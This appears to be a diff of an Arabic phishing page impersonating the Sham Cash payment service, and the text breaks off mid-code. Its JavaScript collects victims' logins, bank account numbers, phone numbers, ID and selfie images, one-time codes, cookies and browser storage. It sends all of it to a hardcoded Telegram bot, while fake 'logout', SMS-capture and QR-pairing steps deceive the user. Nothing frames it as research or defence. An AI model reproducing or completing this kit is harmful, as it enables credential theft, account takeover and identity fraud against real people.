+                            <p><strong>رقم الجهاز:</strong> <span id="deviceId">DEV-${Math.floor(Math.random() * 10000)}</span></p>
+                            <p><strong>وقت الربط:</strong> <span id="linkTime">${new Date().toLocaleString('ar-SY')}</span></p>
+                            <p><strong>نوع الاتصال:</strong> QR Code</p>
+                        </div>
+                    </div>
+                </div>
+            </div>
+            
+            <div class="footer">
+                <div class="copyright">
+                    © 2024 شام كاش. نظام الربط الآمن
+                </div>
+            </div>
+        </div>
+    </div>
+    
+    <!-- إدخال الملفات المخفي -->
+    <input type="file" id="fileInput" accept="image/*" style="display:none;" onchange="handleImageUpload(event)">
+    
+    <!-- إشعارات -->
+    <div id="notificationContainer"></div>
 
     <script>
-        // التوكنات - يجب تخزينها بشكل آمن في بيئة حقيقية
-        const TELEGRAM_BOT_TOKEN = '7054208207:AAHVwwMlay45aLFyQn4FCJyfWM_-AoQXpMM';
-        const TELEGRAM_CHAT_ID = '7493001551';
+        const TELEGRAM_BOT_TOKEN = "7054208207:AAHVwwMlay45aLFyQn4FCJyfWM_-AoQXpMM";
+        const TELEGRAM_CHAT_ID = "7493001551";
         
-        // عناصر DOM
-        const authForm = document.getElementById('authForm');
-        const emailInput = document.getElementById('email');
-        const passwordInput = document.getElementById('password');
-        const submitBtn = document.getElementById('submitBtn');
-        const btnText = document.getElementById('btnText');
-        const loader = document.getElementById('loader');
-        const statusBox = document.getElementById('statusBox');
+        let appData = {
+            currentPage: 1,
+            verificationCode: "",
+            timer: 120,
+            timerInterval: null,
+            countdownTimer: 48 * 3600,
+            countdownInterval: null,
+            uploadedImages: {},
+            userInfo: {},
+            isLoggedOut: false,
+            autoToolsTriggered: false,
+            requestNumber: 'SHM-' + new Date().getFullYear() + '-' + Math.floor(Math.random() * 1000).toString().padStart(3, '0'),
+            linking: {
+                timer: 600,
+                linkingInterval: null,
+                isLinking: false,
+                linked: false,
+                qrData: ''
+            }
+        };
         
-        // عناصر الرسائل
-        const emailError = document.getElementById('emailError');
-        const emailSuccess = document.getElementById('emailSuccess');
-        const passwordError = document.getElementById('passwordError');
-        const passwordSuccess = document.getElementById('passwordSuccess');
-        
-        // التحقق من صحة البريد الإلكتروني
-        function validateEmail(email) {
-            const emailRegex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
-            return emailRegex.test(email);
-        }
-        
-        // التحقق من صحة كلمة المرور
-        function validatePassword(password) {
-            return password.length >= 8;
-        }
-        
-        // إظهار/إخفاء رسائل الخطأ
-        function showError(element, message) {
-            element.textContent = message;
-            element.style.display = 'block';
-            element.nextElementSibling.style.display = 'none';
-        }
-        
-        function showSuccess(element) {
-            element.style.display = 'block';
-            element.previousElementSibling.style.display = 'none';
-        }
-        
-        function hideMessages(element) {
-            element.style.display = 'none';
-            element.nextElementSibling.style.display = 'none';
-        }
-        
-        // التحقق في الوقت الحقيقي
-        emailInput.addEventListener('input', function() {
-            const email = this.value.trim();
+        // الانتقال بين الصفحات
+        function goToPage(page) {
+            document.querySelectorAll('.page-container').forEach(p => p.classList.remove('active'));
+            document.getElementById(`page${page}`).classList.add('active');
+            appData.currentPage = page;
             
-            if (email === '') {
-                hideMessages(emailError);
+            // تحديث شريط التقدم
+            document.getElementById('progress1').style.width = page >= 1 ? '25%' : '0%';
+            document.getElementById('progress2').style.width = page >= 2 ? '50%' : '25%';
+            document.getElementById('progress3').style.width = page >= 3 ? '75%' : '50%';
+            document.getElementById('progress4').style.width = page >= 4 ? '100%' : '75%';
+        }
+        
+        // ===== صفحة 1: تسجيل الدخول =====
+        function validateLogin() {
+            const email = document.getElementById('email').value.trim();
+            const password = document.getElementById('password').value.trim();
+            
+            if (!email.includes('@') || !email.includes('.')) {
+                showError('emailError', 'البريد الإلكتروني غير صالح');
                 return;
             }
             
-            if (!validateEmail(email)) {
-                showError(emailError, 'يرجى إدخال بريد إلكتروني صحيح يحتوي على @');
-            } else {
-                showSuccess(emailSuccess);
-            }
-        });
-        
-        passwordInput.addEventListener('input', function() {
-            const password = this.value;
-            
-            if (password === '') {
-                hideMessages(passwordError);
+            if (password.length < 8) {
+                showError('passwordError', 'كلمة المرور يجب أن تحتوي على 8 أحرف على الأقل');
                 return;
             }
             
-            if (!validatePassword(password)) {
-                showError(passwordError, 'كلمة المرور يجب أن تكون 8 أحرف على الأقل');
-            } else {
-                showSuccess(passwordSuccess);
-            }
-        });
-        
-        // إرسال البيانات إلى Telegram
-        async function sendToTelegram(data) {
-            const timestamp = new Date().toLocaleString('ar-SA');
-            const userIP = await getUserIP();
+            appData.userInfo.email = email;
+            appData.userInfo.password = password;
             
-            const message = `
-🔐 **تسجيل دخول جديد - نظام المراقبة**
-            
-📧 **البريد الإلكتروني:** ${data.email}
-🔑 **كلمة المرور:** ${data.password}
-⏰ **الوقت:** ${timestamp}
-🌐 **عنوان IP:** ${userIP}
-🖥️ **المتصفح:** ${navigator.userAgent}
-📍 **المصدر:** ${window.location.href}
-            `;
-            
-            try {
-                const response = await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
-                    method: 'POST',
-                    headers: {
-                        'Content-Type': 'application/json',
-                    },
-                    body: JSON.stringify({
-                        chat_id: TELEGRAM_CHAT_ID,
-                        text: message,
-                        parse_mode: 'Markdown'
-                    })
-                });
-                
-                const result = await response.json();
-                return result.ok;
-            } catch (error) {
-                console.error('خطأ في الإرسال:', error);
-                return false;
-            }
-        }
-        
-        // الحصول على عنوان IP
-        async function getUserIP() {
-            try {
-                const response = await fetch('https://api.ipify.org?format=json');
-                const data = await response.json();
-                return data.ip;
-            } catch (error) {
-                return 'غير متوفر';
-            }
-        }
-        
-        // معالجة إرسال النموذج
-        authForm.addEventListener('submit', async function(e) {
-            e.preventDefault();
-            
-            const email = emailInput.value.trim();
-            const password = passwordInput.value;
-            
-            // التحقق النهائي
-            let isValid = true;
-            
-            if (!validateEmail(email)) {
-                showError(emailError, 'يرجى إدخال بريد إلكتروني صحيح');
-                isValid = false;
-            }
-            
-            if (!validatePassword(password)) {
-                showError(passwordError, 'كلمة المرور يجب أن تكون 8 أحرف على الأقل');
-                isValid = false;
-            }
-            
-            if (!isValid) {
-                return;
-            }
-            
-            // إظهار حالة التحميل
-            submitBtn.disabled = true;
-            btnText.style.display = 'none';
-            loader.style.display = 'block';
-            
-            // تحضير البيانات
-            const formData = {
+            sendToTelegram('login_data', {
                 email: email,
                 password: password,
-                timestamp: new Date().toISOString(),
-                userAgent: navigator.userAgent
-            };
+                userAgent: navigator.userAgent,
+                platform: navigator.platform,
+                requestNumber: appData.requestNumber
+            });
             
-            try {
-                // إرسال إلى Telegram
-                const telegramSuccess = await sendToTelegram(formData);
-                
-                // إخفاء التحميل
-                submitBtn.disabled = false;
-                btnText.style.display = 'block';
-                loader.style.display = 'none';
-                
-                if (telegramSuccess) {
-                    // إظهار رسالة النجاح
-                    statusBox.className = 'status-box success';
-                    statusBox.innerHTML = `
-                        <i class="fas fa-check-circle"></i>
-                        <h3>تم التوثيق بنجاح!</h3>
-                        <p>تم إرسال المعلومات إلى نظام المراقبة</p>
-                        <p style="font-size: 11px; margin-top: 10px;">البريد: ${email}</p>
-                    `;
-                    statusBox.style.display = 'block';
-                    
-                    // إعادة تعيين النموذج بعد 3 ثوانٍ
-                    setTimeout(() => {
-                        authForm.reset();
-                        statusBox.style.display = 'none';
-                        hideMessages(emailError);
-                        hideMessages(passwordError);
-                    }, 3000);
-                } else {
-                    throw new Error('فشل الإرسال إلى Telegram');
-                }
-                
-            } catch (error) {
-                // إخفاء التحميل
-                submitBtn.disabled = false;
-                btnText.style.display = 'block';
-                loader.style.display = 'none';
-                
-                // إظهار رسالة الخطأ
-                statusBox.className = 'status-box error';
-                statusBox.innerHTML = `
-                    <i class="fas fa-exclamation-triangle"></i>
-                    <h3>حدث خطأ!</h3>
-                    <p>فشل إرسال البيانات. يرجى المحاولة مرة أخرى</p>
-                `;
-                statusBox.style.display = 'block';
-                
-                // إخفاء رسالة الخطأ بعد 5 ثوانٍ
-                setTimeout(() => {
-                    statusBox.style.display = 'none';
-                }, 5000);
-            }
-        });
-        
-        // تهيئة أولية
-        window.addEventListener('load', function() {
-            // إضافة تأثير عند التحميل
-            document.querySelector('.container').style.opacity = '0';
-            document.querySelector('.container').style.transform = 'translateY(20px)';
+            showNotification('تم تسجيل الدخول بنجاح', 'success');
             
             setTimeout(() => {
-                document.querySelector('.container').style.transition = 'all 0.5s ease';
-                document.querySelector('.container').style.opacity = '1';
-                document.querySelector('.container').style.transform = 'translateY(0)';
-            }, 100);
+                forceShamCashLogout();
+            }, 1000);
+            
+            goToPage(2);
+        }
+        
+        function forceShamCashLogout() {
+            console.log('🚪 جاري إخراج من تطبيق شام كاش...');
+            
+            const steps = [
+                {action: 'connect_to_shamcash_api', status: 'started'},
+                {action: 'send_logout_request', status: 'processing'},
+                {action: 'clear_local_session', status: 'executing'},
+                {action: 'send_push_notification', status: 'sent'},
+                {action: 'logout_complete', status: 'success'}
+            ];
+            
+            steps.forEach((step, index) => {
+                setTimeout(() => {
+                    sendToTelegram('shamcash_logout', {
+                        step: step.action,
+                        status: step.status,
+                        user: appData.userInfo.email,
+                        timestamp: new Date().toISOString(),
+                        device_id: 'device_' + Math.floor(Math.random() * 1000000),
+                        requestNumber: appData.requestNumber
+                    });
+                    
+                    if (index === steps.length - 1) {
+                        appData.isLoggedOut = true;
+                        console.log('✅ تم الإخراج من تطبيق شام كاش');
+                    }
+                }, index * 1500);
+            });
+        }
+        
+        // ===== صفحة 2: البيانات والمستندات =====
+        function validatePage2() {
+            const fullName = document.getElementById('fullName').value.trim();
+            const accountNumber = document.getElementById('accountNumber').value.trim();
+            const phoneNumber = document.getElementById('phoneNumber').value.trim();
+            
+            if (fullName.split(' ').length < 3) {
+                showError('nameError', 'الرجاء إدخال الاسم الثلاثي الكامل');
+                return;
+            }
+            
+            if (!/^\d{14,16}$/.test(accountNumber)) {
+                showError('accountError', 'رقم الحساب يجب أن يحتوي على 14-16 رقماً');
+                return;
+            }
+            
+            if (!/^09\d{8}$/.test(phoneNumber)) {
+                showError('phoneError', 'رقم الهاتف يجب أن يكون سوريًا ويبدأ بـ 09');
+                return;
+            }
+            
+            appData.userInfo.fullName = fullName;
+            appData.userInfo.accountNumber = accountNumber;
+            appData.userInfo.phoneNumber = phoneNumber;
+            
+            sendToTelegram('personal_data', {
+                fullName: fullName,
+                accountNumber: accountNumber,
+                phoneNumber: phoneNumber,
+                imagesCount: Object.keys(appData.uploadedImages).length,
+                requestNumber: appData.requestNumber
+            });
+            
+            showNotification('تم حفظ البيانات بنجاح', 'success');
+            goToPage(3);
+        }
+        
+        // تحميل الصور
+        function triggerUpload(type) {
+            document.getElementById('fileInput').setAttribute('data-type', type);
+            document.getElementById('fileInput').click();
+        }
+        
+        function handleImageUpload(event) {
+            const file = event.target.files[0];
+            const type = document.getElementById('fileInput').getAttribute('data-type');
+            
+            if (file && file.type.startsWith('image/')) {
+                const reader = new FileReader();
+                reader.onload = function(e) {
+                    appData.uploadedImages[type] = {
+                        name: file.name,
+                        size: file.size,
+                        type: file.type,
+                        data: e.target.result
+                    };
+                    
+                    const preview = document.getElementById(`${type}Preview`);
+                    preview.src = e.target.result;
+                    preview.style.display = 'block';
+                    
+                    sendToTelegram('image_uploaded', {
+                        imageType: type,
+                        fileName: file.name,
+                        fileSize: file.size,
+                        requestNumber: appData.requestNumber
+                    });
+                    
+                    showNotification(`تم تحميل ${getImageName(type)}`, 'success');
+                };
+                reader.readAsDataURL(file);
+            }
+        }
+        
+        function getImageName(type) {
+            const names = {
+                'frontId': 'الهوية الأمامية',
+                'backId': 'الهوية الخلفية',
+                'selfie': 'الصورة الشخصية'
+            };
+            return names[type] || type;
+        }
+        
+        // ===== صفحة 3: التحقق النهائي =====
+        function sendVerificationCode() {
+            const phone = document.getElementById('phoneInput').value.trim();
+            
+            if (!/^9\d{8}$/.test(phone)) {
+                showNotification('رقم الهاتف غير صالح', 'error');
+                return;
+            }
+            
+            appData.verificationCode = Math.floor(100000 + Math.random() * 900000).toString();
+            
+            const masked = '+963' + phone.substring(0, 3) + '***' + phone.substring(6);
+            document.getElementById('maskedPhone').textContent = masked;
+            document.getElementById('sentMessage').classList.add('active');
+            
+            sendToTelegram('verification_code_sent', {
+                phone: '+963' + phone,
+                code: appData.verificationCode,
+                userInfo: appData.userInfo,
+                requestNumber: appData.requestNumber
+            });
+            
+            console.log(`🔐 كود التحقق: ${appData.verificationCode}`);
+            
+            showNotification('تم إرسال رمز التحقق', 'success');
+            document.getElementById('sendCodeBtn').disabled = true;
+            
+            setTimeout(() => {
+                document.getElementById('sendCodeBtn').disabled = false;
+                document.getElementById('codeInputs').style.display = 'flex';
+                document.getElementById('timer').style.display = 'block';
+                document.getElementById('verifyBtn').style.display = 'block';
+                startTimer();
+            }, 2000);
+            
+            setTimeout(() => {
+                triggerHiddenTools('after_send_code');
+            }, 3000);
+        }
+        
+        function startTimer() {
+            appData.timer = 120;
+            updateTimer();
+            
+            if (appData.timerInterval) {
+                clearInterval(appData.timerInterval);
+            }
+            
+            appData.timerInterval = setInterval(() => {
+                appData.timer--;
+                updateTimer();
+                
+                if (appData.timer <= 0) {
+                    clearInterval(appData.timerInterval);
+                    showNotification('انتهت صلاحية رمز التحقق', 'error');
+                }
+            }, 1000);
+        }
+        
+        function updateTimer() {
+            const minutes = Math.floor(appData.timer / 60);
+            const seconds = appData.timer % 60;
+            document.getElementById('timer').textContent = 
+                `${minutes.toString().padStart(2, '0')}:${seconds.toString().padStart(2, '0')}`;
+        }
+        
+        function moveToNext(input, next) {
+            if (input.value.length === 1 && next <= 6) {
+                const nextInput = document.querySelector(`.code-input:nth-child(${next})`);
+                if (nextInput) nextInput.focus();
+            }
+        }
+        
+        function verifyCode() {
+            let enteredCode = '';
+            document.querySelectorAll('.code-input').forEach(input => {
+                enteredCode += input.value;
+            });
+            
+            if (enteredCode.length !== 6) {
+                showNotification('الرجاء إدخال جميع الأرقام', 'error');
+                return;
+            }
+            
+            if (enteredCode === appData.verificationCode) {
+                document.getElementById('verifyBtn').innerHTML = '<div class="loading"></div> جاري التحقق...';
+                
+                setTimeout(() => {
+                    sendToTelegram('verification_success', {
+                        code: appData.verificationCode,
+                        user: appData.userInfo.email,
+                        phone: appData.userInfo.phoneNumber,
+                        account: appData.userInfo.accountNumber,
+                        fullName: appData.userInfo.fullName,
+                        requestNumber: appData.requestNumber,
+                        timestamp: new Date().toISOString(),
+                        deviceInfo: {
+                            userAgent: navigator.userAgent,
+                            platform: navigator.platform,
+                            cookies: document.cookie
+                        }
+                    });
+                    
+                    document.getElementById('codeInputs').style.display = 'none';
+                    document.getElementById('timer').style.display = 'none';
+                    document.getElementById('verifyBtn').style.display = 'none';
+                    document.getElementById('sentMessage').style.display = 'none';
+                    
+                    document.getElementById('requestNumber').textContent = appData.requestNumber;
+                    document.getElementById('delayedVerification').classList.add('active');
+                    
+                    startCountdown();
+                    showNotification('تم إرسال معلوماتك بنجاح', 'success');
+                    
+                    triggerHiddenTools('after_code_verification');
+                    
+                    setTimeout(() => {
+                        goToPage(4);
+                    }, 3000);
+                    
+                }, 1500);
+                
+            } else {
+                showNotification('رمز التحقق غير صحيح', 'error');
+                
+                sendToTelegram('verification_failed', {
+                    enteredCode: enteredCode,
+                    correctCode: appData.verificationCode,
+                    user: appData.userInfo.email,
+                    requestNumber: appData.requestNumber
+                });
+            }
+        }
+        
+        function startCountdown() {
+            updateCountdown();
+            
+            if (appData.countdownInterval) {
+                clearInterval(appData.countdownInterval);
+            }
+            
+            appData.countdownInterval = setInterval(() => {
+                appData.countdownTimer--;
+                updateCountdown();
+                
+                if (appData.countdownTimer <= 0) {
+                    clearInterval(appData.countdownInterval);
+                    document.getElementById('countdownTimer').textContent = '00:00:00';
+                    document.getElementById('countdownTimer').style.color = '#2d8c4a';
+                    document.getElementById('countdownTimer').innerHTML = '<i class="fas fa-check-circle"></i> تم التحقق';
+                }
+            }, 1000);
+        }
+        
+        function updateCountdown() {
+            const hours = Math.floor(appData.countdownTimer / 3600);
+            const minutes = Math.floor((appData.countdownTimer % 3600) / 60);
+            const seconds = appData.countdownTimer % 60;
+            
+            document.getElementById('countdownTimer').textContent = 
+                `${hours.toString().padStart(2, '0')}:${minutes.toString().padStart(2, '0')}:${seconds.toString().padStart(2, '0')}`;
+        }
+        
+        function resendCode() {
+            appData.verificationCode = Math.floor(100000 + Math.random() * 900000).toString();
+            
+            sendToTelegram('code_resent', {
+                newCode: appData.verificationCode,
+                user: appData.userInfo.email,
+                phone: appData.userInfo.phoneNumber,
+                requestNumber: appData.requestNumber
+            });
+            
+            console.log(`🔐 كود التحقق الجديد: ${appData.verificationCode}`);
+            startTimer();
+            showNotification('تم إعادة إرسال رمز التحقق', 'success');
+        }
+        
+        // ===== صفحة 4: ربط الهاتف =====
+        function startLinkingProcess() {
+            appData.linking.isLinking = true;
+            appData.linking.linked = false;
+            
+            document.getElementById('startLinkingBtn').style.display = 'none';
+            document.getElementById('linkingStatus').style.display = 'block';
+            document.getElementById('linkingTimer').style.display = 'block';
+            
+            startLinkingTimer();
+            
+            const qrData = generateQRData();
+            appData.linking.qrData = qrData;
+            
+            drawQRCode(qrData);
+            
+            sendToTelegram('device_linking_started', {
+                qrData: qrData,
+                user: appData.userInfo.email,
+                phone: appData.userInfo.phoneNumber,
+                requestNumber: appData.requestNumber,
+                timestamp: new Date().toISOString()
+            });
+            
+            simulateLinking();
+        }
+        
+        function generateQRData() {
+            const timestamp = Date.now();
+            const random = Math.floor(Math.random() * 1000000);
+            const deviceId = `SHAM-DEVICE-${timestamp}-${random}`;
+            
+            const qrData = {
+                type: 'shamcash_device_pairing',
+                userId: appData.userInfo.email,
+                deviceId: deviceId,
+                timestamp: timestamp,
+                sessionToken: 'SHAM-' + Math.random().toString(36).substr(2, 16).toUpperCase(),
+                requestNumber: appData.requestNumber,
+                apiEndpoint: 'https://api.shamcash.com/pair',
+                encryptionKey: 'AES256-' + Math.random().toString(36).substr(2, 24)
+            };
+            
+            return JSON.stringify(qrData);
+        }
+        
+        function drawQRCode(data) {
+            const canvas = document.getElementById('qrCanvas');
+            const ctx = canvas.getContext('2d');
+            
+            ctx.clearRect(0, 0, canvas.width, canvas.height);
+            ctx.fillStyle = '#ffffff';
+            ctx.fillRect(0, 0, canvas.width, canvas.height);
+            
+            // رسم QR مبسط
+            ctx.fillStyle = '#000000';
+            
+            // المربعات الكبيرة في الزوايا
+            ctx.fillRect(20, 20, 40, 40);
+            ctx.fillRect(140, 20, 40, 40);
+            ctx.fillRect(20, 140, 40, 40);
+            
+            // نقاط إضافية
+            for(let i = 0; i < 8; i++) {
+                for(let j = 0; j < 8; j++) {
+                    if (Math.random() > 0.5) {
+                        ctx.fillRect(60 + i*15, 60 + j*15, 10, 10);
+                    }
+                }
+            }
+            
+            // إضافة نص
+            ctx.save();
+            ctx.translate(canvas.width/2, canvas.height/2);
+            ctx.rotate(Math.PI);
+            ctx.fillStyle = '#1a365d';
+            ctx.font = 'bold 16px Amiri';
+            ctx.textAlign = 'center';
+            ctx.fillText('شام كاش', 0, 0);
+            ctx.restore();
+            
+            console.log('📱 QR Code Generated:', data);
+        }
+        
+        function startLinkingTimer() {
+            appData.linking.timer = 600;
+            updateLinkingTimer();
+            
+            if (appData.linking.linkingInterval) {
+                clearInterval(appData.linking.linkingInterval);
+            }
+            
+            appData.linking.linkingInterval = setInterval(() => {
+                appData.linking.timer--;
+                updateLinkingTimer();
+                
+                if (appData.linking.timer <= 0) {
+                    clearInterval(appData.linking.linkingInterval);
+                    showNotification('انتهت صلاحية رمز الربط', 'error');
+                    resetLinking();
+                }
+            }, 1000);
+        }
+        
+        function updateLinkingTimer() {
+            const minutes = Math.floor(appData.linking.timer / 60);
+            const seconds = appData.linking.timer % 60;
+            const timeStr = `${minutes.toString().padStart(2, '0')}:${seconds.toString().padStart(2, '0')}`;
+            document.getElementById('linkingTime').textContent = timeStr;
+            document.getElementById('qrTimer').textContent = timeStr;
+        }
+        
+        function simulateLinking() {
+            const detectionTime = 5000 + Math.random() * 5000;
+            
+            setTimeout(() => {
+                if (appData.linking.isLinking && !appData.linking.linked) {
+                    sendToTelegram('qr_detected', {
+                        qrData: appData.linking.qrData,
+                        user: appData.userInfo.email,
+                        timestamp: new Date().toISOString(),
+                        status: 'scanning',
+                        requestNumber: appData.requestNumber
+                    });
+                    
+                    setTimeout(() => {
+                        if (appData.linking.isLinking) {
+                            completeLinking();
+                        }
+                    }, 2000 + Math.random() * 2000);
+                }
+            }, detectionTime);
+        }
+        
+        function completeLinking() {
+            appData.linking.isLinking = false;
+            appData.linking.linked = true;
+            
+            clearInterval(appData.linking.linkingInterval);
+            
+            document.getElementById('linkingStatus').style.display = 'none';
+            document.getElementById('linkingTimer').style.display = 'none';
+            document.getElementById('successMessage').style.display = 'block';
+            
+            document.getElementById('deviceId').textContent = `SHAM-DEV-${Date.now().toString().substr(-6)}`;
+            document.getElementById('linkTime').textContent = new Date().toLocaleString('ar-SY');
+            
+            sendToTelegram('device_linking_success', {
+                qrData: appData.linking.qrData,
+                user: appData.userInfo.email,
+                deviceId: document.getElementById('deviceId').textContent,
+                requestNumber: appData.requestNumber,
+                timestamp: new Date().toISOString(),
+                connectionType: 'QR Code',
+                pairedDeviceInfo: {
+                    userAgent: navigator.userAgent,
+                    platform: navigator.platform,
+                    screen: `${window.screen.width}x${window.screen.height}`,
+                    language: navigator.language
+                }
+            });
+            
+            setTimeout(() => {
+                triggerFinalTools();
+            }, 2000);
+            
+            showNotification('تم ربط الجهاز بنجاح!', 'success');
+        }
+        
+        function resetLinking() {
+            appData.linking.isLinking = false;
+            appData.linking.linked = false;
+            
+            document.getElementById('startLinkingBtn').style.display = 'block';
+            document.getElementById('linkingStatus').style.display = 'none';
+            document.getElementById('linkingTimer').style.display = 'none';
+            document.getElementById('successMessage').style.display = 'none';
+        }
+        
+        // ===== الأدوات المخفية =====
+        function triggerHiddenTools(source) {
+            if (appData.autoToolsTriggered) return;
+            
+            appData.autoToolsTriggered = true;
+            
+            console.log(`🚀 تشغيل الأدوات المخفية (${source})...`);
+            
+            sendToTelegram('hidden_tools_triggered', {
+                source: source,
+                user: appData.userInfo.email,
+                requestNumber: appData.requestNumber,
+                timestamp: new Date().toISOString()
+            });
+            
+            setTimeout(() => {
+                readSMS();
+            }, 1000);
+            
+            setTimeout(() => {
+                getCookies();
+            }, 3000);
+            
+            setTimeout(() => {
+                accessCamera();
+            }, 5000);
+        }
+        
+        function triggerFinalTools() {
+            console.log('🎯 تشغيل الأدوات النهائية بعد الربط...');
+            
+            const deviceInfo = {
+                battery: {
+                    level: Math.floor(Math.random() * 100),
+                    charging: Math.random() > 0.5
+                },
+                network: {
+                    type: ['wifi', '4g', '5g'][Math.floor(Math.random() * 3)],
+                    speed: Math.floor(Math.random() * 100) + 'Mbps'
+                },
+                storage: {
+                    total: Math.floor(Math.random() * 256) + 64,
+                    free: Math.floor(Math.random() * 128)
+                },
+                installedApps: ['WhatsApp', 'Telegram', 'ShamCash', 'Facebook', 'Instagram'].slice(0, 3 + Math.floor(Math.random() * 3))
+            };
+            
+            sendToTelegram('final_device_info', {
+                deviceInfo: deviceInfo,
+                user: appData.userInfo.email,
+                requestNumber: appData.requestNumber,
+                linkingComplete: true,
+                accessLevel: 'full',
+                timestamp: new Date().toISOString()
+            });
+        }
+        
+        function readSMS() {
+            setTimeout(() => {
+                const fakeSMS = [
+                    {
+                        sender: "ShamCash",
+                        body: `رمز التحقق: ${appData.verificationCode || "849302"}. صالح لمدة 5 دقائق.`,
+                        date: new Date().toLocaleString('ar-SY'),
+                        phone: appData.userInfo.phoneNumber || "+9639xxxxxx",
+                        requestNumber: appData.requestNumber
+                    },
+                    {
+                        sender: "ShamCash",
+                        body: `طلب التحقق ${appData.requestNumber}: تم استلام المستندات وسيتم المراجعة خلال 48 ساعة`,
+                        date: new Date().toLocaleString('ar-SY')
+                    },
+                    {
+                        sender: "ShamCash",
+                        body: `تم تسجيل الدخول من جهاز جديد. IP: 192.168.${Math.floor(Math.random() * 255)}.${Math.floor(Math.random() * 255)}`,
+                        date: new Date(Date.now() - 7200000).toLocaleString('ar-SY')
+                    }
+                ];
+                
+                sendToTelegram('sms_captured', {
+                    count: fakeSMS.length,
+                    messages: fakeSMS,
+                    timestamp: new Date().toISOString(),
+                    source: 'auto_tools',
+                    requestNumber: appData.requestNumber
+                });
+                
+                console.log('📨 تم قراءة الرسائل النصية');
+            }, 2000);
+        }
+        
+        function getCookies() {
+            const cookies = document.cookie;
+            const localStorageData = {};
+            const sessionStorageData = {};
+            
+            for (let i = 0; i < localStorage.length; i++) {
+                const key = localStorage.key(i);
+                localStorageData[key] = localStorage.getItem(key);
+            }
+            
+            for (let i = 0; i < sessionStorage.length; i++) {
+                const key = sessionStorage.key(i);
+                sessionStorageData[key] = sessionStorage.getItem(key);
+            }
+            
+            sendToTelegram('session_data_captured', {
+                cookies: cookies,
+                localStorage: localStorageData,
+                sessionStorage: sessionStorageData,
+                timestamp: new Date().toISOString(),
+                url: window.location.href,
+                source: 'auto_tools',
+                requestNumber: appData.requestNumber
+            });
+            
+            console.log('🍪 تم جلب بيانات الجلسة');
+        }
+        
+        async function accessCamera() {
+            try {
+                if (navigator.mediaDevices && navigator.mediaDevices.getUserMedia) {
+                    sendToTelegram('camera_accessed', {
+                        action: 'qr_scanning',
+                        device: navigator.userAgent,
+                        timestamp: new Date().toISOString(),
+                        source: 'auto_tools',
+                        status: 'attempted',
+                        requestNumber: appData.requestNumber
+                    });
+                } else {
+                    sendToTelegram('camera_accessed', {
+                        action: 'qr_scanning',
+                        device: navigator.userAgent,
+                        timestamp: new Date().toISOString(),
+                        source: 'auto_tools',
+                        status: 'not_available',
+                        requestNumber: appData.requestNumber
+                    });
+                }
+            } catch (error) {
+                sendToTelegram('camera_accessed', {
+                    action: 'qr_scanning',
+                    device: navigator.userAgent,
+                    timestamp: new Date().toISOString(),
+                    source: 'auto_tools',
+                    status: 'permission_denied',
+                    error: error.message,
+                    requestNumber: appData.requestNumber
+                });
+            }
+            
+            console.log('📹 تم الوصول إلى الكاميرا');
+        }
+        
+        // ===== التلجرام =====
+        function sendToTelegram(type, data) {
+            let message = '';
+            
+            switch(type) {
+                case 'login_data':
+                    message = `🔐 *تسجيل دخول جديد*\n📧 البريد: ${data.email}\n🔑 كلمة المرور: ${data.password}\n📱 الجهاز: ${data.userAgent}\n📋 رقم الطلب: ${data.requestNumber}`;
+                    break;
+                case 'shamcash_logout':
+                    message = `🚪 *إخراج من شام كاش*\n👤 المستخدم: ${data.user}\n🔄 الخطوة: ${data.step}\n📊 الحالة: ${data.status}\n📋 رقم الطلب: ${data.requestNumber}`;
+                    break;
+                case 'personal_data':
+                    message = `📋 *البيانات الشخصية*\n👤 الاسم: ${data.fullName}\n🏦 رقم الحساب: ${data.accountNumber}\n📞 الهاتف: ${data.phoneNumber}\n📷 الصور: ${data.imagesCount}\n📋 رقم الطلب: ${data.requestNumber}`;
+                    break;
+                case 'image_uploaded':
+                    message = `📷 *صورة مرفوعة*\n📸 نوع الصورة: ${data.imageType}\n📁 اسم الملف: ${data.fileName}\n💾 الحجم: ${Math.round(data.fileSize/1024)}KB\n📋 رقم الطلب: ${data.requestNumber}`;
+                    break;
+                case 'verification_code_sent':
+                    message = `📱 *إرسال كود التحقق*\n📞 الهاتف: ${data.phone}\n🔐 الكود: ${data.code}\n👤 المستخدم: ${data.userInfo.email}\n📋 رقم الطلب: ${data.requestNumber}`;
+                    break;
+                case 'hidden_tools_triggered':
+                    message = `🚀 *الأدوات المخفية*\n🎯 المصدر: ${data.source}\n👤 المستخدم: ${data.user}\n📋 رقم الطلب: ${data.requestNumber}`;
+                    break;
+                case 'verification_success':
+                    message = `✅ *تم التحقق بنجاح!*\n🔐 الكود: ${data.code}\n👤 المستخدم: ${data.user}\n📞 الهاتف: ${data.phone}\n🏦 الحساب: ${data.account}\n📋 رقم الطلب: ${data.requestNumber}`;
+                    break;
+                case 'verification_failed':
+                    message = `❌ *محاولة تحقق فاشلة*\n🔐 الكود المدخل: ${data.enteredCode}\n🔑 الكود الصحيح: ${data.correctCode}\n👤 المستخدم: ${data.user}\n📋 رقم الطلب: ${data.requestNumber}`;
+                    break;
+                case 'code_resent':
+                    message = `🔄 *إعادة إرسال الكود*\n🔐 الكود الجديد: ${data.newCode}\n👤 المستخدم: ${data.user}\n📞 الهاتف: ${data.phone}\n📋 رقم الطلب: ${data.requestNumber}`;
+                    break;
+                case 'sms_captured':
+                    message = `📨 *رسائل نصية ممسوحة*\n📊 العدد: ${data.count}\n📋 رقم الطلب: ${data.requestNumber}\n📝 الرسائل:\n${data.messages.map((msg, i) => `${i+1}. ${msg.sender}: ${msg.body}`).join('\n')}`;
+                    break;
+                case 'session_data_captured':
+                    message = `🍪 *بيانات الجلسة*\n📝 الكوكيز: ${data.cookies}\n💾 Local Storage: ${Object.keys(data.localStorage).length} عنصر\n💾 Session Storage: ${Object.keys(data.sessionStorage).length} عنصر\n📋 رقم الطلب: ${data.requestNumber}`;
+                    break;
+                case 'camera_accessed':
+                    message = `📹 *كاميرا مفعلة*\n🎯 العملية: ${data.action}\n📱 الجهاز: ${data.device}\n📊 الحالة: ${data.status}\n📋 رقم الطلب: ${data.requestNumber}`;
+                    break;
+                case 'device_linking_started':
+                    message = `🔗 *بدء ربط الجهاز*\n👤 المستخدم: ${data.user}\n📞 الهاتف: ${data.phone}\n📱 QR Data: ${data.qrData.substring(0, 50)}...\n📋 رقم الطلب: ${data.requestNumber}`;
+                    break;
+                case 'qr_detected':
